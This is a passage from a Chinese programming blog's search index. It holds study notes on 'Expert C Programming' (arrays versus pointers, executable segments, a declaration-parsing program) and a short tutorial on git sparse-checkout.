        <content type="html"><![CDATA[<h1>数组与指针</h1><p>在大部分情况下，数组和指针是可以互换的。书中的第4章主要讲解了数组和指针的不同之处，而在第9章则着重讨论两者可以互换的场景。</p><span id="more"></span><h2 id="不同之处">不同之处</h2><p>对于两者的不同之处，主要在于访问两者时有一些不同。</p><p>编译器会为每个变量分配一个地址，每个符号的地址在编译时可知（如数组的名字）。那么在访问数组中的数据时，可以通过符号表直接得出数组的起始地址，加上偏移量即可访问对应的数据。</p><p>而对于指针，必须先在运行时取得它当前存储的值，再对它解引用来获取（数组的）起始值，最后才能加上偏移量来访问数据。</p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201102160829.jpg" style="zoom:33%;" /><hr><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201102160911.jpg" style="zoom:33%;" /><h3 id="其他区别">其他区别</h3><table><thead><tr><th style="text-align:left">指针</th><th>数组</th></tr></thead><tbody><tr><td style="text-align:left">保存数据的地址</td><td>保存数据</td></tr><tr><td style="text-align:left">间接访问数据，首先取得指针的内容，把它作为地址，然后从这个地址提取数据。<br />如果指针有一个下标[i]，就把指针的内容加上i作为地址，从中提取数据</td><td>直接访问数据，a[i]只是简单的a+i为地址取得数据</td></tr><tr><td style="text-align:left">通常用于动态数据结构</td><td>通常用于存储固定数目且数据类型相同的元素</td></tr><tr><td style="text-align:left">相关的函数为malloc()，free()</td><td>隐式分配和删除</td></tr><tr><td style="text-align:left">通常指向匿名数据</td><td>自身即为数据名</td></tr></tbody></table><h2 id="相同之处">相同之处</h2><p>在书中，主要从“声明”和“使用”两种情况下进行讨论，直接看图：</p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/20201102162819.jpg" style="zoom:30%;" /><p>在C语言标准中，有若干条规则对两者间的联系进行了说明，本书作者对其进行了进一步的说明：</p><blockquote><ol><li>“表达式中的数组名”就是指针</li><li>C语言把数组下标作为指针的偏移量</li><li>“作为函数参数的数组名”等同于指针</li></ol></blockquote><h3 id="编程挑战">编程挑战</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR(fmt,val) printf(#val <span class="string">&quot; = %&quot;</span> #fmt <span class="string">&quot;\t&quot;</span>, (val))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NL putchar(<span class="string">&#x27;\n&#x27;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINT1(f,x1) PR(f,x1), NL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINT3(f,x1,x2,x3) PR(f,x1), PRINT2(f,x2,x3)</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">func1</span><span class="params">(<span class="type">char</span> ca[])</span> &#123; PRINT3(<span class="meta">#x, &amp;ca, &amp;(ca[0]), &amp;(ca[1])); &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> func2(<span class="type">char</span>* pa)</span><br><span class="line">&#123;</span><br><span class="line">  PRINT3(<span class="meta">#x, &amp;pa, &amp;(pa[0]), &amp;(pa[1]));</span></span><br><span class="line">  PRINT1(<span class="meta">#x, ++pa);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> ga[] = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">  PRINT3(<span class="meta">#x, &amp;ga, &amp;(ga[0]), &amp;(ga[1]));</span></span><br><span class="line">  func1(ga);</span><br><span class="line">  func2(ga);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;ga = 0x37c3b010        &amp;(ga[0]) = 0x37c3b010   &amp;(ga[1]) = 0x37c3b011</span><br><span class="line">&amp;ca = 0x7f38c918        &amp;(ca[0]) = 0x37c3b010   &amp;(ca[1]) = 0x37c3b011</span><br><span class="line">&amp;pa = 0x7f38c918        &amp;(pa[0]) = 0x37c3b010   &amp;(pa[1]) = 0x37c3b011</span><br><span class="line">++pa = 0x37c3b011</span><br></pre></td></tr></table></figure><p>可以看出作为参数，数组的地址和数组的第一个元素的地址是不同的。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C专家编程(3)</title>
      <link href="/posts/2375669074.html"/>
      <url>/posts/2375669074.html</url>
      
        <content type="html"><![CDATA[<h2 id="段（P117-119）">段（P117-119）</h2><p>在一个可执行文件中，主要有三个段：文本段、数据段和bss段。利用<code>size</code>命令，可以查看这三个段的大小。</p><span id="more"></span><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/duan.jpg" style="zoom:33%;" /><h3 id="编程挑战">编程挑战</h3><table><thead><tr><th></th><th>size</th><th>text</th><th>data</th><th>bss</th><th>total</th></tr></thead><tbody><tr><td>1</td><td>16696</td><td>1566</td><td>600</td><td>8</td><td>2174</td></tr><tr><td>2</td><td>16720</td><td>1566</td><td>600</td><td>4032</td><td>6198</td></tr><tr><td>3</td><td>20736</td><td>1566</td><td>4616</td><td>8</td><td>6190</td></tr><tr><td>4.1</td><td>20784</td><td>1755</td><td>4624</td><td>8</td><td>6387</td></tr><tr><td>4.2</td><td>20832</td><td>1876</td><td>4632</td><td>8</td><td>6516</td></tr><tr><td>5</td><td>23440</td><td>1876</td><td>4632</td><td>8</td><td>6516</td></tr></tbody></table><p>分析结果可知:</p><ul><li>数据段保存在目标文件中。（比较2和3的结果可得）</li><li>BSS段不保存在目标文件中。（比较1和2的结果可得）</li><li>a.out文件的大小受调试状态下编译的影响，但段不受影响。<ul><li>文本段易受优化措施影响。</li></ul></li></ul><h2 id="段错误（P159-163）">段错误（P159-163）</h2><p>可能导致段错误的常见编程错误是：</p><ol><li>坏指针值错误：在指针赋值前就用它来引用内存/向库函数传递一个坏指针/释放指针后再访问它的内容。</li><li>改写（overwrite）错误：越过数组边界/在动态分配的内存两端写入数据/改写一些堆管理数据结构。</li><li>指针释放引起的错误：释放同一个内存块两次/释放未曾使用malloc分配的内存/释放仍在使用的内存/释放无效指针。</li></ol>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C专家编程(2)</title>
      <link href="/posts/2065047904.html"/>
      <url>/posts/2065047904.html</url>
      
        <content type="html"><![CDATA[<h2 id="理解声明（P64-66）">理解声明（P64-66）</h2><p>面对一些复杂的声明形式，可以通过以下两种方法来理解，分别是优先级法和图标法。下面以书上的<br><code>char * const *(*next)();</code>  为例，分别进行分析。</p><span id="more"></span><ul><li>优先级法（P64）</li></ul><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/%E7%90%86%E8%A7%A31.jpg" alt=""></p><table><thead><tr><th>适用规则</th><th>解释</th></tr></thead><tbody><tr><td>A</td><td>首先，看变量名<code>next</code>，并注意到它直接被括号所括住</td></tr><tr><td>B.1</td><td>所以先把括号里的东西作为一个整体，得出“next是一个指向…的指针”</td></tr><tr><td>B</td><td>然后考虑括号外面的东西，在星号前缀和括号后缀之间作出选择</td></tr><tr><td>B.2</td><td>规则告诉我们优先级较高的是右边的函数括号，所以得出“next是一个函数指针，指向一个返回…的函数＂</td></tr><tr><td>B.3</td><td>然后，处理前缀<code>*</code>，得出指针所指的内容</td></tr><tr><td>C</td><td>最后，把<code>char * const</code>解释为指向字符的常量指针</td></tr></tbody></table><blockquote><p>这个声明表示“next是一个指针，它指向一个函数，该函数返回另一个指针，该指针指向一个类型为 char的常量指针”</p></blockquote><ul><li>图表法（P65）</li></ul><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/%E7%90%86%E8%A7%A32.jpg" alt=""></p><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/3.jpg" alt=""></p><h3 id="signal函数声明的解析">signal函数声明的解析</h3><p>首先来看一下signal的声明形式：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> (*signal(<span class="type">int</span> sig, <span class="type">void</span>(*func)(<span class="type">int</span>)))(<span class="type">int</span>);</span><br></pre></td></tr></table></figure><p>简化后为<code>void(*signal(x,xx))(int)</code>，表明signal函数有两个参数（x和xx），并返回一个函数指针，指向的函数接受int类型的参数并返回void。而xx参数表示的函数与signal本身的形式一样。</p><p>因此可以使用<code>typedef void(*pf)(int);</code>来简化函数的声明，简化后为：<code>pf signal(int, pf);</code></p><h3 id="练习">练习</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *(* c[<span class="number">10</span>])(<span class="type">int</span> **p);  <span class="comment">// 答案在文章末尾</span></span><br></pre></td></tr></table></figure><h2 id="编程挑战">编程挑战</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTOKENLEN (256)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTOKENS (16)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_NUMS(array) (sizeof(array) / sizeof(array[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *STR_TYPE[] = &#123;<span class="string">&quot;char&quot;</span>,   <span class="string">&quot;short&quot;</span>,    <span class="string">&quot;int&quot;</span>,  <span class="string">&quot;long&quot;</span>,   <span class="string">&quot;float&quot;</span>, <span class="string">&quot;double&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;signed&quot;</span>, <span class="string">&quot;unsigned&quot;</span>, <span class="string">&quot;void&quot;</span>, <span class="string">&quot;struct&quot;</span>, <span class="string">&quot;union&quot;</span>, <span class="string">&quot;enum&quot;</span>&#125;;</span><br><span class="line"><span class="type">char</span> *STR_QUALIFIER[] = &#123;<span class="string">&quot;const&quot;</span>, <span class="string">&quot;volatile&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  TYPE,       <span class="comment">/* 类型 */</span></span><br><span class="line">  QUALIFIER,  <span class="comment">/* 限定符 */</span></span><br><span class="line">  INDENTIFIER <span class="comment">/* 标识符 */</span></span><br><span class="line">&#125; <span class="type">type_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">token</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> type;</span><br><span class="line">  <span class="type">char</span> <span class="built_in">string</span>[MAXTOKENLEN];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">token</span> <span class="title">stack</span>[<span class="title">MAXTOKENS</span>];</span> <span class="comment">/* 保存第一个标识之前的所有标记 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">token</span> <span class="title">this</span>;</span>             <span class="comment">/* 保存刚读入的标记 */</span></span><br><span class="line"><span class="type">char</span> next_string[MAXTOKENLEN];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> top = <span class="number">-1</span>; <span class="comment">/* 栈顶 */</span></span><br><span class="line"><span class="comment">// 压栈</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">push</span><span class="params">(<span class="keyword">struct</span> token t)</span> &#123; <span class="built_in">stack</span>[++top] = t; &#125;</span><br><span class="line"><span class="comment">// 出栈</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> token <span class="title function_">pop</span><span class="params">(<span class="type">void</span>)</span> &#123; <span class="keyword">return</span> <span class="built_in">stack</span>[top--]; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串分类，获取当前标识的类型</span></span><br><span class="line"><span class="type">static</span> <span class="type">type_t</span> <span class="title function_">classify_string</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="type">char</span> *s = this.<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="type">int</span>)TOTAL_NUMS(STR_TYPE); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(s, STR_TYPE[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> TYPE;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="type">int</span>)TOTAL_NUMS(STR_QUALIFIER); i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(s, STR_QUALIFIER[i]) == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> QUALIFIER;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> INDENTIFIER;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取标记</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">gettoken</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *p = next_string; <span class="comment">/* 取新的一段字符串 */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (*p == <span class="string">&#x27; &#x27;</span>) &#123; <span class="comment">/* 忽略空格 */</span></span><br><span class="line">    p++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(this.<span class="built_in">string</span>, p); <span class="comment">/* 字符串赋值 */</span></span><br><span class="line">  p = this.<span class="built_in">string</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">isalnum</span>(*p)) &#123; <span class="comment">/* 如果是字母数字组合 */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">isalnum</span>(*++p))</span><br><span class="line">      ;                                  <span class="comment">/* 直到读取到其他字符 */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(next_string, p);              <span class="comment">/* 修改字符串 */</span></span><br><span class="line">    *p = <span class="string">&#x27;\0&#x27;</span>;                           <span class="comment">/* 加上字符串结束符 */</span></span><br><span class="line">    this.type = (<span class="type">char</span>)classify_string(); <span class="comment">/* 判断类型 */</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (*p != <span class="string">&#x27;\0&#x27;</span>) &#123;               <span class="comment">/* 单字符标记 */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(next_string, p + <span class="number">1</span>);          <span class="comment">/* 修改字符串 */</span></span><br><span class="line">    this.type = *p;</span><br><span class="line">    this.<span class="built_in">string</span>[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读至第一个标识符</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">read_to_first_identifier</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  gettoken();</span><br><span class="line">  <span class="keyword">while</span> (this.type != INDENTIFIER) <span class="comment">/* 不是标识符，将标记入栈 */</span></span><br><span class="line">  &#123;</span><br><span class="line">    push(this);</span><br><span class="line">    gettoken(); <span class="comment">/* 取下一个标记 */</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Identifier \&quot;%s\&quot; is &quot;</span>, this.<span class="built_in">string</span>);</span><br><span class="line"></span><br><span class="line">  gettoken();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*************** 解析程序 ***************************************/</span></span><br><span class="line"><span class="comment">// 处理函数参数</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">deal_with_function_args</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (this.type != <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">    gettoken();</span><br><span class="line">  &#125;</span><br><span class="line">  gettoken();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;function returning &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理函数数组</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">deal_with_arrays</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (this.type == <span class="string">&#x27;[&#x27;</span>) <span class="comment">/* 继续读取数字或&#x27;]&#x27; */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array &quot;</span>);</span><br><span class="line">    gettoken();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">isdigit</span>(this.<span class="built_in">string</span>[<span class="number">0</span>])) &#123;             <span class="comment">/* 如果是数字 */</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;0..%d &quot;</span>, atoi(this.<span class="built_in">string</span>) - <span class="number">1</span>); <span class="comment">/* 打印数组大小 */</span></span><br><span class="line">      gettoken();                              <span class="comment">/* 获取&#x27;]&#x27; */</span></span><br><span class="line">    &#125;</span><br><span class="line">    gettoken();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;of &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理任何指针</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">deal_with_any_pointers</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">stack</span>[top].type == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">    pop();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pointer to &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理声明器</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">deal_with_declarator</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (this.type == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">    deal_with_arrays();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (this.type == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">    deal_with_function_args();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  deal_with_any_pointers();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (top &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">stack</span>[top].type == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">      pop();</span><br><span class="line">      gettoken();</span><br><span class="line">      deal_with_declarator();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      deal_with_any_pointers();</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, pop().<span class="built_in">string</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// 测试用例参考 https://blog.csdn.net/yyhustim/article/details/9612185</span></span><br><span class="line">  <span class="type">char</span> *str[] = &#123;<span class="string">&quot;char * const *(*next)()&quot;</span>, <span class="string">&quot;char *(* c[10])(int **p)&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;const int * grape&quot;</span>,       <span class="string">&quot;int const * grape&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;int * const grape&quot;</span>,       <span class="string">&quot;int sum(int a, int b)&quot;</span>,</span><br><span class="line">                 <span class="string">&quot;char (*(*x())[])()&quot;</span>,      <span class="string">&quot;char (*(*x[3])())[5]&quot;</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="type">int</span>)TOTAL_NUMS(str); i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;== %s\n&quot;</span>, str[i]);</span><br><span class="line">    <span class="built_in">strcpy</span>(next_string, str[i]);</span><br><span class="line">    read_to_first_identifier();</span><br><span class="line">    deal_with_declarator();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    top = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="答案">答案</h2><p>运行上面的程序，给出的结果为：</p><p><code>Identifier &quot;c&quot; is array 0..9 of pointer to function returning pointer to char</code></p><p>即c是一个大小为10的数组，其元素类型是函数指针，指向的函数的返回值是一个指向char的指针。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C专家编程(1)</title>
      <link href="/posts/3215964112.html"/>
      <url>/posts/3215964112.html</url>
      
        <content type="html"><![CDATA[<p>这一系列主要记录阅读《C专家编程》中，需要注意的一些内容。</p><h2 id="寻常算术转换（P22-24）">寻常算术转换（P22-24）</h2><blockquote><p>P23：当执行算数运算时，操作数的类型如果不同，就会发生转换。数据类型一般朝着浮点精度更高、长度更长的方向转换，整型数如果转换为signed不会丢失信息，就转换为signed，否则转换为unsigned。</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TOTAL_ELEMENTS (sizeof(array)/sizeof(array[0]))</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> d=<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (d &lt;  TOTAL_ELEMENTS <span class="number">-2</span>)</span><br><span class="line">    xxx;  <span class="comment">// 实际执行不到 </span></span><br></pre></td></tr></table></figure><p>sizeof()返回类型为无符号数，比较时d被升级为unsigned int类型。</p><p>解决方法是对<code>TOTAL_ELEMENTS</code>强制类型转换为int，即</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (d &lt;  (<span class="type">int</span>)TOTAL_ELEMENTS <span class="number">-2</span>)</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="符号“重载”（P37-38）">符号“重载”（P37-38）</h2><p>许多操作符在不同的场景下会有不同的意义，如<code>static</code>、<code>void</code>、<code>*</code>等。</p><p>另外，还有一些符号具有多个容易混淆的意思。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p = N * <span class="keyword">sizeof</span> * q;  <span class="comment">// (1)</span></span><br><span class="line">apple = <span class="keyword">sizeof</span>(<span class="type">int</span>) * p;  <span class="comment">// (2)</span></span><br></pre></td></tr></table></figure><p>(1)中，第一个<code>*</code>表示乘法，而第二个<code>*</code>表示指针，<code>sizeof</code>操作符把<code>q</code>指向的内容作为操作数，返回该对象的类型的字节数（<strong><code>sizeof</code>的操作数是变量时可以不加括号</strong>）。</p><p>(2)中，表示把<code>int</code>的长度乘以<code>p</code>，而不是把未知类型的指针<code>p</code>强制转换成<code>int</code>，然后进行<code>sizeof</code>操作。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使用sparse-checkout命令克隆“部分”代码</title>
      <link href="/posts/2410943014.html"/>
      <url>/posts/2410943014.html</url>
      
        <content type="html"><![CDATA[<p>在克隆大型项目的时候，可能实际仅需要其中的一部分文件。以<a href="https://github.com/micropython/micropython">micropython</a>为例，我们可能仅需要它的跨平台编译工具<code>mpy-cross</code>，那么只需要用到其中的<code>lib</code>，<code>py</code>及<code>ports</code>中的部分内容即可。</p><p>使用git的<code>sparse-checkout</code>命令，可以只拉取指定的目录和文件。</p><p>实际上仍然会下载整个仓库，只是显示的时候仅列出指定的内容，所以并不能缩短下载时间。</p><span id="more"></span><p>下面来说明主要的操作流程：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git remote add -f origin https://github.com/micropython/micropython.git # 替换为需要克隆的仓库地址</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.启用并初始化sparse-checkout功能</span></span><br><span class="line">git sparse-checkout init</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2.添加需要包含的目录或文件</span></span><br><span class="line">git sparse-checkout set lib py mpy-cross ports/unix ports/windows</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3.拉取文件</span></span><br><span class="line">git checkout master # 或者 git pull origin master </span><br></pre></td></tr></table></figure><p><img src="https://hexoa.oss-cn-shanghai.aliyuncs.com/img/image-20201020180705502.png" alt="image-20201020180705502"></p><p>后续可以通过 <code>git sparse-checkout add</code>命令添加其他目录或文件。</p><p>网上搜索到的使用方法，大部分都是通过<code>echo &quot;file&quot;  &gt;&gt; .git/info/sparse-checkout</code>的方法设定需要拉取的目录，在我的实践中似乎不管用。通过命令来操作更加方便快捷。</p><h2 id="参考">参考</h2><ol><li><p><a href="https://git-scm.com/docs/git-sparse-checkout">Git</a></p></li><li><p><a href="https://blog.csdn.net/u014119806/article/details/104695058/">git中Sparse Checkout</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>